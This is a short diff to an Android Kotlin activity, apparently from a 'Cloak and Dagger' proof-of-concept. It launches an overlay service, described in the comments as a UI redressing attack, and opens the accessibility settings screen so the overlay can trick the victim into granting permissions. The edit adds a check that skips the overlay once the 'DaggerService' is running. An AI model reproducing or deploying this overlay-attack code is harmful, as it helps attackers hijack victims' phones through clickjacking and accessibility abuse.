@@ -25,11 +25,14 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startOverlayService() {
-        // Start the topOverlay service to begin the UI redressing attack
-        startService(Intent(this, CloakService::class.java))
-        // Launch victim settings activity and close this activity.
-        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
-        finish()
+        // No need for the cloak if the dagger already came out
+        if (!DaggerService.running) {
+            // Start the topOverlay service to begin the UI redressing attack
+            startService(Intent(this, CloakService::class.java))
+            // Launch victim settings activity and close this activity.
+            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+            finish()
+        }
     }
 
     private fun overlayPermissionRequired() = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)
